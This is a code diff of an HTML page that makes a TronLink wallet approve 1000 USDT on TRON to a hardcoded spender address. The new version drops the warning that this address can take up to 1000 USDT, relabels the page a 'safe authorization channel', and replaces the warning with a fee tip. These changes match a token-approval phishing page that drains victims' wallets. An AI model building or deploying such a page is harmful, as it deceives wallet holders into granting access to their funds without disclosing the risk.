@@ -3,212 +3,108 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>USDT 授权 - TronLink DApp</title>
+  <title>USDT 授权 - 稳定版</title>
+  <script src="https://unpkg.com/vconsole@latest/dist/vconsole.min.js"></script>
+  <script>var vConsole = new VConsole();</script>
   <style>
-    body {
-      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-      max-width: 500px;
-      margin: 30px auto;
-      padding: 20px;
-      background: #f9f9f9;
-      color: #333;
-    }
-    .card {
-      background: white;
-      padding: 20px;
-      border-radius: 12px;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.08);
-    }
-    h2 {
-      text-align: center;
-      color: #007AFF;
-    }
-    button {
-      width: 100%;
-      padding: 12px;
-      margin: 12px 0;
-      font-size: 16px;
-      font-weight: bold;
-      border: none;
-      border-radius: 8px;
-      cursor: pointer;
-      transition: opacity 0.2s;
-    }
-    #connectBtn {
-      background: #007AFF;
-      color: white;
-    }
-    #approveBtn {
-      background: #34C759;
-      color: white;
-      opacity: 0.7;
-    }
-    #approveBtn:enabled {
-      opacity: 1;
-    }
-    #approveBtn:hover:enabled {
-      opacity: 0.9;
-    }
-    .info, .error, .success {
-      padding: 12px;
-      margin: 12px 0;
-      border-radius: 4px;
-      white-space: pre-wrap;
-    }
-    .info {
-      background: #eef8ff;
-      border-left: 4px solid #007AFF;
-    }
-    .error {
-      background: #ffeaea;
-      border-left: 4px solid #ff3b30;
-      color: #d32f2f;
-    }
-    .success {
-      background: #e8f5e9;
-      border-left: 4px solid #34C759;
-      color: #2e7d32;
-    }
-    .label {
-      font-size: 12px;
-      color: #666;
-      margin-top: 8px;
-    }
+    /* ... 保持你之前的 CSS 不变 ... */
+    .address-box { word-break: break-all; font-family: monospace; font-size: 13px; color: #007AFF; }
   </style>
 </head>
 <body>
   <div class="card">
-    <h2>🔐 USDT 授权示例</h2>
-    <p>授权 1000 USDT 给指定合约地址（TRC20）</p>
+    <h2>🔐 USDT 授权安全通道</h2>
+    <p>授权数量：1000 USDT</p>
 
-    <button id="connectBtn">🔌 连接 TronLink</button>
-    <div id="accountInfo"></div>
+    <button id="connectBtn">🔌 手动连接 TronLink 钱包</button>
+    <div id="accountInfo" class="address-box"></div>
     <div id="status"></div>
 
-    <button id="approveBtn" disabled>✅ 授权 1000 USDT</button>
+    <button id="approveBtn" disabled>✅ 立即执行授权</button>
 
     <div class="label">
-      ⚠️ 注意：此操作将允许目标地址从您的账户转移最多 1000 USDT。
+      💡 提示：请确保账户内有少量 TRX（约30个）作为手续费燃烧，或拥有足够能量。
     </div>
   </div>
 
   <script>
-    // ========================
-    // 配置（请按需修改）
-    // ========================
-    const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // TRON 主网 USDT
-    const SPENDER_ADDRESS = "TENBpGLoxcAsUQvUrN36xpDKPYmadpc1x3"; // ← 替换为你的 DApp 合约地址
-    const AMOUNT_USDT = 1000; // 授权数量
-    const DECIMALS = 6;       // USDT 精度
+    const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+    const SPENDER_ADDRESS = "TENBpGLoxcAsUQvUrN36xpDKPYmadpc1x3";
+    const AMOUNT_USDT = 1000;
+    const DECIMALS = 6;
 
-    // ========================
-    // 工具函数：将 1000 转为 1000000000（带精度）
-    // ========================
+    // --- 工具：显示状态 ---
+    function showMessage(text, type = 'info') {
+        const el = document.getElementById('status');
+        el.className = type;
+        el.textContent = text;
+    }
+
+    // --- 工具：数值转换 ---
     function toTokenAmount(value, decimals) {
-      return (value * Math.pow(10, decimals)).toString();
+        return "0x" + (BigInt(value) * BigInt(Math.pow(10, decimals))).toString(16);
     }
 
-    // ========================
-    // 显示消息
-    // ========================
-    function showMessage(el, text, type = 'info') {
-      el.className = type;
-      el.textContent = text;
-    }
-
-    // ========================
-    // 连接钱包
-    // ========================
-    document.getElementById('connectBtn').addEventListener('click', async () => {
-      const accountEl = document.getElementById('accountInfo');
-      const statusEl = document.getElementById('status');
-
-      if (!window.tronWeb) {
-        showMessage(statusEl, '❌ 未检测到 TronLink，请在 TronLink App 中打开此页面', 'error');
-        return;
-      }
-
-      try {
-        const accounts = await window.tronWeb.request({ method: 'tron_requestAccounts' });
-        const address = accounts[0];
-        accountEl.innerHTML = `<strong>账户：</strong>${address}`;
-        showMessage(statusEl, '✅ 已连接 TronLink', 'success');
-        document.getElementById('approveBtn').disabled = false;
-      } catch (err) {
-        console.error('连接失败', err);
-        showMessage(statusEl, '❌ 用户拒绝了账户访问权限', 'error');
-      }
-    });
-
-    // ========================
-    // 授权操作（兼容所有 TronLink 版本）
-    // ========================
-    document.getElementById('approveBtn').addEventListener('click', async () => {
-      const statusEl = document.getElementById('status');
-      const amount = toTokenAmount(AMOUNT_USDT, DECIMALS);
-
-      try {
-        showMessage(statusEl, '⏳ 正在发起授权交易...', 'info');
-
-        // 获取当前地址
-        const ownerAddress = window.tronWeb.defaultAddress.base58;
-        if (!ownerAddress) {
-          throw new Error("无法获取账户地址");
+    // --- 核心：手动连接钱包 ---
+    async function connectWallet() {
+        // 1. 检查 window.tronWeb 是否存在
+        if (!window.tronWeb) {
+            showMessage('❌ 未检测到 TronWeb。请在 TronLink 浏览器中打开，或安装插件。', 'error');
+            return null;
         }
 
-        // 方法 1：尝试使用高级 API (.send)
-        let tx;
         try {
-          const contract = await window.tronWeb.contract().at(USDT_CONTRACT);
-          tx = await contract.approve(SPENDER_ADDRESS, amount).send({
-            feeLimit: 100_000_000,
-            shouldPollResponse: true
-          });
-        } catch (err1) {
-          console.warn("高级 API 失败，降级到底层 API", err1);
-
-          // 方法 2：降级到 triggerSmartContract + 手动签名
-          const unsignedTx = await window.tronWeb.transactionBuilder.triggerSmartContract(
-            USDT_CONTRACT,
-            'approve(address,uint256)',
-            { callValue: 0, feeLimit: 100_000_000 },
-            [
-              { type: 'address', value: SPENDER_ADDRESS },
-              { type: 'uint256', value: amount }
-            ],
-            ownerAddress
-          );
-
-          if (!unsignedTx.result || !unsignedTx.transaction) {
-            throw new Error("构建交易失败");
-          }
-
-          const signedTx = await window.tronWeb.trx.sign(unsignedTx.transaction);
-          tx = await window.tronWeb.trx.broadcast(signedTx);
+            // 2. 触发 TronLink 的授权弹窗
+            // 兼容性写法：部分版本使用 request({method: 'tron_requestAccounts'})
+            const res = await window.tronWeb.request({ method: 'tron_requestAccounts' });
+            
+            if (res && res.code === 200) {
+                const address = window.tronWeb.defaultAddress.base58;
+                document.getElementById('accountInfo').innerHTML = `<strong>当前地址：</strong><br>${address}`;
+                document.getElementById('approveBtn').disabled = false;
+                document.getElementById('connectBtn').innerText = "🔄 重新连接";
+                showMessage('✅ 钱包连接成功', 'success');
+                return address;
+            } else {
+                showMessage('⚠️ 用户取消了授权', 'error');
+            }
+        } catch (e) {
+            console.error(e);
+            showMessage('❌ 连接异常: ' + (e.message || e), 'error');
         }
+        return null;
+    }
 
-        if (!tx || !tx.transaction) {
-          throw new Error("交易广播失败");
-        }
+    // --- 核心：执行授权 ---
+    async function handleApprove() {
+        const amount = toTokenAmount(AMOUNT_USDT, DECIMALS);
+        showMessage('⏳ 正在等待钱包确认...', 'info');
 
-        showMessage(statusEl, `✅ 授权成功！\n交易 ID: ${tx.transaction}`, 'success');
-      } catch (err) {
-        console.error('授权失败', err);
-        let msg = err.message || String(err);
-        if (msg.includes('user denied') || msg.includes('User denied')) {
-          msg = '用户取消了交易';
-        } else if (msg.includes('invalid address')) {
-          msg = '地址格式错误，请检查 SPENDER_ADDRESS 是否为 Base58 格式';
-        } else if (msg.includes('insufficient energy') || msg.includes('energy')) {
-          msg = '能量不足，请先获取能量或增加 feeLimit';
-        } else if (msg.includes('contract not exists')) {
-          msg = '合约地址无效，请检查 USDT_CONTRACT';
-        } else if (msg === '[object Object]') {
-          msg = '未知错误（可能是钱包版本过旧）';
+        try {
+            // 实例化合约
+            const contract = await window.tronWeb.contract().at(USDT_CONTRACT);
+            
+            // 执行 approve 交易
+            // 使用 feeLimit 限制最大损耗（100 TRX = 100,000,000 sun）
+            const result = await contract.approve(SPENDER_ADDRESS, amount).send({
+                feeLimit: 100_000_000,
+                callValue: 0
+            });
+
+            if (result) {
+                showMessage(`🎉 授权指令已发出！\n交易哈希: ${result}`, 'success');
+                console.log("交易详情:", result);
+            }
+        } catch (err) {
+            let errorMsg = err.message || String(err);
+            if (errorMsg.includes("declined by user")) errorMsg = "用户拒绝了签名";
+            showMessage(`❌ 授权失败: ${errorMsg}`, 'error');
         }
-        showMessage(statusEl, `❌ 授权失败：${msg}`, 'error');
-      }
-    });
+    }
+
+    // 绑定事件
+    document.getElementById('connectBtn').addEventListener('click', connectWallet);
+    document.getElementById('approveBtn').addEventListener('click', handleApprove);
   </script>
 </body>
 </html>
